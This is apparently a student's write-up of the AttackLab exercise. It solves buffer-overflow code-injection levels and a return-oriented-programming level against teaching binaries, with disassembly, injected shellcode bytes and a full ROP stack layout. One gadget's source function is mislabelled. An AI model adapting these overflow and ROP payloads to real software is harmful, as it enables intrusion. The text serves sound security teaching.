# **AttackLab**

## Part I: Code Injection Attacks

- 代码注入攻击针对 `ctarget` 程序，利用缓冲区溢出漏洞注入恶意代码或篡改返回地址，实现调用 `touch1`、`touch2`、`touch3` 函数的目标。`ctarget` 栈地址固定且栈内存可执行，为攻击提供了条件。

### Level 1

- **攻击目标**：通过缓冲区溢出篡改 `getbuf()` 的返回地址，使其跳至 `touch1` 函数而非 `test` 函数。

```assembly
000000000080891c <getbuf>:
  80891c:	48 83 ec 38          	sub    $0x38,%rsp
  808920:	48 89 e7             	mov    %rsp,%rdi
  808923:	e8 94 02 00 00       	callq  808bbc <Gets>
  808928:	b8 01 00 00 00       	mov    $0x1,%eax
  80892d:	48 83 c4 38          	add    $0x38,%rsp
  808931:	c3                   	retq   
```

- **缓冲区大小**：反汇编 `getbuf()` 可知，函数执行 `sub $0x38, %rsp`，说明缓冲区 `buf` 大小为 56 字节（0x38）。

- **返回地址位置**：缓冲区后 8 字节为 `getbuf()` 的返回地址，需将其覆盖为 `touch1` 的起始地址。

- **函数地址**：反汇编 `ctarget` 得 `touch1` 起始地址为 `0x808932`。

- **字节序**：x86-64 架构为小端序，地址需按字节反转存储（`32 89 80 00 00 00 00 00`）。

### Level 2

- **攻击目标**：注入代码，使 `getbuf()` 返回后执行注入代码，将 cookie 传入 `%rdi`（x86-64 函数第一个参数寄存器），再跳至 `touch2`。

- **cookie 值**：从 `cookie.txt` 读取为 `0x4df13892`。
- **注入代码功能**：需实现 `mov $cookie, %rdi` + `ret`，将控制权转移至 `touch2`，需要将 `touch2` 的地址推入函数调用栈。

```assembly
0000000000000000 <.text>:
   0:	48 c7 c7 92 38 f1 4d 	mov    $0x4df13892,%rdi
   7:	68 60 89 80 00       	pushq  $0x808960
   c:	c3                   	retq
```

- **注入代码地址**：缓冲区起始地址为栈地址 `0x556490e0`（通过 GDB 调试确定），注入代码存于缓冲区前 8 字节。

- **touch2 地址**：反汇编得 `touch2` 地址为 `0x808960`。

### Level 3

- **攻击目标**：注入代码，将 cookie 的字符串形式（8 位十六进制，无 `0x`）地址传入 `%rdi`，调用 `touch3`。
- **cookie 字符串**：`0x4df13892` 转换为字符串 `"4df13892"`，末尾需加 null 终止符（`0x00`）。
- **字符串存储位置**：为避免被函数`hexmatch`调用覆盖，存储于远离缓冲区的后段（地址 `0x55649177`）。
- **注入代码功能**：`mov $str_addr, %rdi` + `ret`，跳转至 `touch3`（地址 `0x808a77`），需要将 `touch3` 的地址推入函数调用栈。

```assembly
0000000000000000 <.text>:
   0:	48 c7 c7 77 91 64 55 	mov    $0x55649177,%rdi
   7:	68 77 8a 80 00       	pushq  $0x808a77
   c:	c3                   	retq 
```

## Part II: Return-Oriented Programming

- **攻击目标**：ROP 攻击针对 `rtarget` 程序，其栈地址随机化且栈不可执行，需通过拼接现有代码片段（gadget）实现攻击逻辑。利用 `gadget farm` 中的 gadget，将 cookie 传入 `%rdi`，调用 `touch2`。





- Gadget1：`popq %rax`（提取栈中 cookie 存入 `%rax`），在`gadget farm` 中的`getval_352` 可以发现以下字段 `58 c3`：

``` assembly
0000000000808b43 <getval_352>:
  808b43:	b8 a2 21 d7 58       	mov    $0x58d721a2,%eax
  808b48:	c3                   	retq
```

- Gadget2：`movq %rax, %rdi`（将 `%rax` 内容转移至 `%rdi`），在`gadget farm` 中的`getval_352` 可以发现以下字段 `48 89 c7 c3`：

```assembly
0000000000808b21 <setval_366>:
  808b21:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)
  808b27:	c3                   	retq
```

- 由此可以获得该任务的栈布局如下：

```c
/* 填充 getbuf() 的缓冲区 */
00 00 00 00 00 00 00 00 ...
/* gadget1 的地址 */
/* 将 cookie pop 入 %rax */
47 8b 80 00 00 00 00 00
/* cookie 在此处 */
92 38 f1 4d 00 00 00 00
/* gadget2 的地址 */
/* 将 cookie 从 %rax 转移入 %rdi */
23 8b 80 00 00 00 00 00
/* touch2 的地址 */
60 89 80 00 00 00 00 00
```

1. 填充 56 字节缓冲区。
2. Gadget1 地址（`pop %rax`）→ 执行后栈指针指向 cookie。
3. Cookie 值（`0x4df13892`，小端序）→ 存入 `%rax`。
4. Gadget2 地址（`mov %rax, %rdi`）→ 执行后 `%rdi = cookie`
5. Touch2 地址 → 跳转至 `touch2`。